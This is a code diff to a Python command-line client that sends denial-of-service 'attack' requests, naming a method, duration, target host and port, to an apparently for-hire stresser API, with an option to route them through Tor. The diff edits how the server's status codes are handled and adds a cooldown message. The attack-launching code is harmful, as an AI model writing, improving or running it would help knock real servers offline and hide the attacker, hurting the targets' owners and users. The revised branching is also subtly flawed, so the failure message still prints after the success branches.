@@ -241,8 +241,14 @@ def main(user, password, tor):
             if tor == "off":
                 response = requests.get(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')
 
-                if response.status_code == 200 or 400:
+                if response.status_code == 200:
                     print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {Fore.RESET}")
+                    main(user, password, tor)
+                if response.status_code == 400:
+                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
+                    main(user, password, tor)
+                if response.status_code == 508:
+                    print(f"{Fore.LIGHTRED_EX}Global cooldown or the host has been limited, please wait!{Fore.RESET}")
                     main(user, password, tor)
                 else:
                     print(f"{Fore.LIGHTRED_EX}Failed to send the attack request. Server response: {response.status_code}{Fore.RESET}")
@@ -250,8 +256,14 @@ def main(user, password, tor):
             if tor == "on":
                 response = tor_request(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')
 
-                if response.status_code == 200 or 400:
+                if response.status_code == 200:
                     print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
+                    main(user, password, tor)
+                if response.status_code == 400:
+                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
+                    main(user, password, tor)
+                if response.status_code == 508:
+                    print(f"{Fore.LIGHTRED_EX}Global cooldown or the host has been limited, please wait!{Fore.RESET}")
                     main(user, password, tor)
                 else:
                     print(f"{Fore.LIGHTRED_EX}Failed to send the attack request, Server response: {response.status_code}{Fore.RESET}")
